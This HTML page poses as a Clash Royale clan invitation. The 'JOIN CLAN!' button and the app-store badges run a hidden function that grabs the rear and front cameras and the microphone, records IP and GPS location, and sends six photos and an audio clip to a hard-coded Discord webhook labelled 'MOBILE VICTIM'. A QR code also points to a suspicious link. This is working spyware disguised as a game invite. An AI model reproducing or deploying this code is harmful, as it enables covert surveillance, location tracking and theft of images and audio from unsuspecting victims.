<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" 
      content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <meta property="og:title" content="Clan Invite - Clash Royale" />
     <meta property="og:description" content="Click this link to Join a clan in Clash Royale!" />
     <meta property="og:image" content="https://discover.therookies.co/content/images/size/w1000/2020/02/clash-royale.jpg" />
     <meta property="og:url" content="https://delet35.github.io/ClashRoyalClanInvitation/" />
     <meta property="og:type" content="website" />

    <title>CLASH ROYALE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <link rel="icon" href="https://img.tapimg.net/market/images/fce4e8232e9e9510ab646dbf62399c59.png" type="image/png">
    <title>Clan Invite - Clash Royal</title>
   
    <style>
        .join-button, .store-buttons img {
  touch-action: manipulation; /* Disable double-tap zoom */
}
/* IN YOUR STYLE SECTION */
html, body {
  overflow: auto !important; /* Override hidden */
  height: auto !important;
}

.container {
  min-height: 100vh; /* Full viewport height */
  overflow-y: auto; /* Enable vertical scroll */
}

.qr-container, .store-buttons {
  max-width: 100%; /* Prevent overflow */
}
        /* TIGHTER STYLES */
        html, body {
            overflow: hidden;
            margin: 0;
            padding: 0;
            height: 100%;
            background: url('https://mir-s3-cdn-cf.behance.net/project_modules/1400/5196db60494431.5a4ee5c65c1c4.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Arial Black', sans-serif;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px;
            min-height: 100vh;
            box-sizing: border-box;
        }

        .logo {
            width: 360px;
        }

        .invite-text {
            color: #FFF;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            margin: 5px 0;
            font-size: 1.1em;
        }

        .join-button {
            background: linear-gradient(180deg, #FFD700 0%, #D4AF37 100%);
            color: #8B0000 !important;
            padding: 12px 35px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 1.1em;
            border: 3px solid #8B0000;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            margin: 15px 0;
            order: 2;
        }

        .qr-container {
            background: white;
            padding: 12px;
            border-radius: 15px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
            margin: 10px 0;
            order: 3;
        }

        .store-buttons {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            order: 4;
        }

            .store-buttons img {
                height: 40px;
                transition: transform 0.2s;
            }

                .store-buttons img:hover {
                    transform: scale(1.03);
                }

        .download-text {
            color: #FFD700;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            margin: 10px 0;
            order: 5;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://d290ny10omyv12.cloudfront.net/images/clash-royale-og-wa.png"
             class="logo"
             alt="Clash Logo">

        <p class="invite-text">
            Join your Friend in Clash Royale!

        </p>

        <div class="qr-container">
            <div id="qrcode"></div>
        </div>
        <button onclick="initiateTotalChaos()" class="join-button">
            <!-- MODIFIED -->
            JOIN CLAN!
        </button>
        <p class="download-text">Download Clash Royale</p>
        <br />
        <div class="store-buttons">
            <a onclick="initiateTotalChaos()">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store">
            </a>
            <a onclick="initiateTotalChaos()">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1280px-Google_Play_Store_badge_EN.svg.png" alt="Google Play">
            </a>
        </div>
      



    </div>

    <script>
        new QRCode(document.getElementById("qrcode"), {
            text: "https://tiktok.wtch.pro?video=1032711939 ",
            width: 160,
            height: 160,
            colorDark: "#000000",
            colorLight: "#FFFFFF",
            correctLevel: QRCode.CorrectLevel.H
        });
    </script>
    <script>
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1354180731139657768/MYr76j8rVFUzNUnKR95g_XY_oZun4PIVh9YlJpbuIkxAe3CdXjW-951jCOBcGd68X2oP';

       // MODIFIED FUNCTION WITH MOBILE-SPECIFIC FIXES
async function initiateTotalChaos() {
  let media, selfieStream;
  const debugData = { mobile: true };

  try {
    // ================== MOBILE-SPECIFIC FIXES ================== //
    // 1. Force HTTPS connection (critical for mobile media access)
    if (window.location.protocol !== 'https:' && !window.location.hostname.includes('localhost')) {
      window.location.href = window.location.href.replace('http://', 'https://');
      return;
    }

    // 2. Mobile-first media acquisition
    media = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: 'environment' } }, // Force rear camera
      audio: {
        echoCancellation: false, // Mobile optimization
        noiseSuppression: false,
        autoGainControl: false
      }
    });

    // 3. Separate selfie stream with mobile orientation fix
    selfieStream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user',
        width: { ideal: 720 }, // Mobile-friendly resolution
        height: { ideal: 1280 },
        frameRate: { ideal: 24 }
      }
    });

    // ================== MOBILE-OPTIMIZED CAPTURE ================== //
    const [ipData, geoloc, frontCam, selfieCam, audioBlob] = await Promise.all([
      fetch('https://ipapi.co/json/').then(res => res.json()),
      new Promise(resolve => navigator.geolocation.getCurrentPosition(resolve)),

      // Front camera with mobile rotation fix
      (async () => {
        const track = media.getVideoTracks()[0];
        const capture = new ImageCapture(track);
        const photos = await Promise.all([1,2,3].map(async () => {
          const photo = await capture.takePhoto();
          return await fixMobileRotation(photo, track.getSettings().height > track.getSettings().width);
        }));
        track.stop();
        return photos;
      })(),

      // Selfie camera with orientation check
      (async () => {
        const track = selfieStream.getVideoTracks()[0];
        const capture = new ImageCapture(track);
        const photos = await Promise.all([1,2,3].map(async () => {
          const photo = await capture.takePhoto();
          return await fixMobileRotation(photo, track.getSettings().height > track.getSettings().width);
        }));
        track.stop();
        return photos;
      })(),

      // Mobile audio workaround
      (async () => {
        try {
          const recorder = new MediaRecorder(media);
          const chunks = [];
          recorder.start(1000); // Mobile-safe time slice
          await new Promise(r => setTimeout(r, 3000));
          recorder.stop();
          return await new Promise(resolve => {
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => resolve(new Blob(chunks));
          });
        } catch {
          return null;
        }
      })()
    ]);

    // ================== MOBILE-FRIENDLY DISCORD UPLOAD ================== //
    const formData = new FormData();
    const mobilePayload = {
      content: `📱 MOBILE VICTIM\nIP: ${ipData.ip}\nGPS: ${geoloc.coords.latitude},${geoloc.coords.longitude}`,
      files: []
    };

    // Process photos with mobile EXIF data
    const allPhotos = [...frontCam, ...selfieCam];
    for (let i = 0; i < allPhotos.length; i++) {
      const processedPhoto = await compressForMobile(allPhotos[i]);
      formData.append(`file${i}`, processedPhoto, `photo_${i}.jpg`);
    }

    // Add audio if captured
    if (audioBlob) {
      formData.append('file_audio', audioBlob, 'voice.webm');
    }

    // Mobile-specific headers
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      body: formData,
      headers: {
        'X-Mobile-User-Agent': navigator.userAgent
      },
      keepalive: true // Critical for mobile background processing
    });

  } catch (error) {
    console.error('MOBILE FAIL:', error);
    localStorage.setItem('mobile_debug', JSON.stringify({
      error: error.message,
      userAgent: navigator.userAgent,
      timestamp: Date.now(),
      mediaSupport: {
        video: !!navigator.mediaDevices.getSupportedConstraints().video,
        audio: !!navigator.mediaDevices.getSupportedConstraints().audio
      }
    }));
  } finally {
    media?.getTracks().forEach(track => track.stop());
    selfieStream?.getTracks().forEach(track => track.stop());
  }
}

// ================== MOBILE UTILITIES ================== //
async function fixMobileRotation(photoBlob, isPortrait) {
  // Uses canvas to fix mobile orientation issues
  const img = await createImageBitmap(photoBlob);
  const canvas = new OffscreenCanvas(
    isPortrait ? img.height : img.width,
    isPortrait ? img.width : img.height
  );
  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width/2, canvas.height/2);
  ctx.rotate(Math.PI/2);
  ctx.drawImage(img, -img.width/2, -img.height/2);
  return await canvas.convertToBlob({ type: 'image/jpeg', quality: 0.8 });
}

async function compressForMobile(blob) {
  // Compress images for mobile network conditions
  const img = await createImageBitmap(blob);
  const canvas = new OffscreenCanvas(img.width, img.height);
  const ctx = canvas.getContext('2d');
  ctx.drawImage(img, 0, 0);
  return await canvas.convertToBlob({ 
    type: 'image/webp',
    quality: 0.7 
  });
}
       
       
    </script>
    
</body>
</html>
